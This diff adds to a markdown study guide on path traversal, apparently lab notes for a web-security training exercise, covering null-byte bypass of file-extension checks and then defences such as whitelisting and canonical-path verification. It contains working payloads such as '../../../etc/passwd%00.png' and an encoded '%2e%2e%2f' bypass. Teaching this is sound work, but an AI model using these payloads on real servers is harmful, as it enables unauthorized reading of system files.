@@ -1815,6 +1815,649 @@ GET /image?filename=218.png HTTP/2
 ```http
 GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
 ```
+---
+
+# Topic: Bypassing File Extension Validation Using Null Bytes
+
+## The Problem
+
+Some applications try to prevent path traversal by requiring files to end with a specific extension.
+
+Example:
+
+```text id="x8n2qa"
+.png
+```
+
+The developer wants users to access only image files.
+
+
+# Normal Request
+
+```text id="5bnr7m"
+filename=218.png
+```
+
+Validation:
+
+```text id="j8v4pk"
+Ends with .png ?
+```
+
+Result:
+
+```text id="r5z7tn"
+YES ✓
+```
+
+The image is returned.
+
+
+# Attacker's Goal
+
+Read:
+
+```text id="z3tq9v"
+/etc/passwd
+```
+
+But the application requires:
+
+```text id="ewr4mj"
+.png
+```
+
+So this fails:
+
+```text id="h6v1xa"
+filename=../../../etc/passwd
+```
+
+because:
+
+```text id="6pvj3d"
+Does not end with .png
+```
+
+
+# What is a Null Byte?
+
+A **null byte** is represented as:
+
+```text id="0v4r8y"
+%00
+```
+
+It represents the end of a string in many older programming languages and APIs.
+
+
+# Bypass Technique
+
+Attacker sends:
+
+```text id="m7x2kp"
+filename=../../../etc/passwd%00.png
+```
+
+Application sees:
+
+```text id="6qv5jb"
+../../../etc/passwd%00.png
+```
+
+and validates:
+
+```text id="u9t3lw"
+Ends with .png ? ✓
+```
+
+
+# What Happens Internally?
+
+The null byte:
+
+```text id="q4n8zh"
+%00
+```
+
+may terminate the string.
+
+The filesystem API effectively receives:
+
+```text id="4w6jrp"
+../../../etc/passwd
+```
+
+and ignores:
+
+```text id="t8p2mn"
+.png
+```
+
+
+# Visualization
+
+### User Input
+
+```text id="n3k5vc"
+../../../etc/passwd%00.png
+```
+
+### Application Check
+
+```text id="4f7rqd"
+Ends with .png ✓
+```
+
+### Null Byte Processing
+
+```text id="7j9vxm"
+../../../etc/passwd
+^
+String ends here
+```
+
+### Actual File Read
+
+```text id="y2m6tp"
+/etc/passwd
+```
+
+# Why Does This Work?
+
+The application validates:
+
+```text id="k8r3bz"
+Input String
+```
+
+but the operating system or underlying API processes:
+
+```text id="z6n1fq"
+String Before %00
+```
+
+The two interpretations are different.
+
+
+# Example Attack Flow
+
+```text id="s5v8qh"
+Attacker
+     ↓
+../../../etc/passwd%00.png
+     ↓
+Application
+Checks .png ✓
+     ↓
+Null Byte Terminates String
+     ↓
+Filesystem Reads
+/etc/passwd
+```
+
+# Modern Reality
+
+ Important:
+
+Most modern languages and frameworks now handle null bytes safely and reject this attack.
+
+However:
+
+* Older applications
+* Legacy code
+* Certain native APIs
+
+may still be vulnerable.
+
+This is why null byte injection remains an important concept for learning path traversal.
 
 ---
 
+# Path Traversal Using Null Byte Injection
+
+![lab1-](screenshots/labp6.png)
+
+## Step 1: Intercept a Product Image Request
+
+1. Open any product page.
+2. Click on a product image.
+3. In Burp Suite, go to:
+
+```text
+Proxy > HTTP History
+```
+
+4. Locate the image request.
+
+Example:
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+## Step 2: Modify the Filename Parameter
+
+Replace:
+
+```http
+filename=218.png
+```
+
+with:
+
+```http
+filename=../../../etc/passwd%00.png
+```
+
+Modified request:
+
+```http
+GET /image?filename=../../../etc/passwd%00.png HTTP/2
+```
+
+## Step 3: Send the Request
+
+1. Forward the modified request.
+2. Observe the response.
+
+
+## Step 4: Read the File Contents
+
+The application returns the contents of:
+
+```text
+/etc/passwd
+```
+
+Example:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+```
+![lab1-](screenshots/labp6b.png)
+
+## Step 5: Lab Solved
+
+Successfully retrieving:
+
+```text
+/etc/passwd
+```
+
+solves the lab.
+![lab1-](screenshots/labp6s.png)
+
+# Why This Works
+
+Some applications require filenames to end with:
+
+```text
+.png
+```
+
+For example:
+
+```text
+filename=../../../etc/passwd.png
+```
+
+would fail because:
+
+```text
+/etc/passwd.png
+```
+
+does not exist.
+
+
+## Null Byte Injection
+
+Payload:
+
+```text
+../../../etc/passwd%00.png
+```
+
+Where:
+
+```text
+%00 = Null Byte
+```
+
+The application sees:
+
+```text
+../../../etc/passwd%00.png
+```
+
+but the underlying file operation may stop processing at:
+
+```text
+%00
+```
+
+Effectively becoming:
+
+```text
+../../../etc/passwd
+```
+
+while bypassing the `.png` validation.
+
+
+## Payload Breakdown
+
+### Supplied Value
+
+```text
+../../../etc/passwd%00.png
+```
+
+### Application Check
+
+```text
+Ends with .png ✔
+```
+
+### File System Interpretation
+
+```text
+../../../etc/passwd
+```
+
+### Final File Accessed
+
+```text
+/etc/passwd
+```
+
+
+# Request Example
+
+### Original Request
+
+```http
+GET /image?filename=218.png HTTP/2
+```
+
+### Modified Request
+
+```http
+GET /image?filename=../../../etc/passwd%00.png HTTP/2
+```
+
+---
+
+# Topic: How to Prevent Path Traversal Attacks
+
+## Main Idea
+
+The best defense is:
+
+```text id="a1b2c3"
+Never let users directly control file paths.
+```
+
+Instead of:
+
+```text id="d4e5f6"
+/loadImage?filename=user_input
+```
+
+use predefined file IDs or filenames.
+
+# Best Solution: Avoid User-Controlled Paths
+
+### Vulnerable
+
+```text id="g7h8i9"
+filename=../../../etc/passwd
+```
+
+The user controls the path.
+
+
+### Safer Design
+
+```text id="j1k2l3"
+imageID=218
+```
+
+The application maps:
+
+```text id="m4n5o6"
+218 → 218.png
+219 → 219.png
+220 → 220.png
+```
+
+The user never provides a filesystem path.
+
+# If User Input Must Be Used
+
+Use **two layers of defense**.
+
+
+# Defense 1: Validate User Input
+
+Accept only expected values.
+
+### Best Option: Whitelist
+
+Allow only known filenames:
+
+```text id="p7q8r9"
+218.png
+219.png
+220.png
+```
+
+Everything else:
+
+```text id="s1t2u3"
+Rejected
+```
+
+
+### Alternative: Character Validation
+
+Allow only:
+
+```text id="v4w5x6"
+A-Z
+a-z
+0-9
+```
+
+Example:
+
+```text id="y7z8a9"
+218.png
+```
+
+Allowed.
+
+
+Example:
+
+```text id="b1c2d3"
+../../../etc/passwd
+```
+
+Rejected because it contains:
+
+```text id="e4f5g6"
+/
+.
+```
+
+
+# Defense 2: Canonicalize the Path
+
+Even after validation, resolve the path and verify it remains inside the allowed directory.
+
+
+### Base Directory
+
+```text id="h7i8j9"
+/var/www/images
+```
+
+### User Input
+
+```text id="k1l2m3"
+../../../etc/passwd
+```
+
+Application creates:
+
+```text id="n4o5p6"
+/var/www/images/../../../etc/passwd
+```
+
+### Canonicalization
+
+The operating system resolves:
+
+```text id="q7r8s9"
+/etc/passwd
+```
+
+Now check:
+
+```text id="t1u2v3"
+Does /etc/passwd start with
+/var/www/images ?
+```
+
+Result:
+
+```text id="w4x5y6"
+NO ✗
+```
+
+Block the request.
+
+
+# Java Example Explained
+
+Code:
+
+```java id="z7a8b9"
+File file = new File(BASE_DIRECTORY, userInput);
+
+if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
+    // process file
+}
+```
+
+## Step-by-Step
+
+### Step 1
+
+Create file path:
+
+```text id="c1d2e3"
+BASE_DIRECTORY + userInput
+```
+
+Example:
+
+```text id="f4g5h6"
+/var/www/images/../../../etc/passwd
+```
+
+### Step 2
+
+Get Canonical Path
+
+```text id="i7j8k9"
+file.getCanonicalPath()
+```
+
+resolves:
+
+```text id="l1m2n3"
+/etc/passwd
+```
+
+
+### Step 3
+
+Check Location
+
+```text id="o4p5q6"
+startsWith(BASE_DIRECTORY)
+```
+
+Check:
+
+```text id="r7s8t9"
+/etc/passwd
+```
+
+starts with:
+
+```text id="u1v2w3"
+/var/www/images
+```
+
+Result:
+
+```text id="x4y5z6"
+False
+```
+
+Access denied.
+
+
+# Secure Flow
+
+```text id="aa11bb"
+User Input
+      ↓
+Input Validation
+      ↓
+Create Path
+      ↓
+Canonicalize Path
+      ↓
+Verify Path Is Inside
+Allowed Directory
+      ↓
+Access Granted
+```
+
+# Why Multiple Defenses?
+
+A single defense can fail.
+
+For example:
+
+```text id="cc22dd"
+../
+```
+
+might be blocked,
+
+but:
+
+```text id="ee33ff"
+%2e%2e%2f
+```
+
+could bypass it.
+
+Using:
+
+1. Input validation
+2. Canonical path verification
+
+provides stronger protection.
+
+---
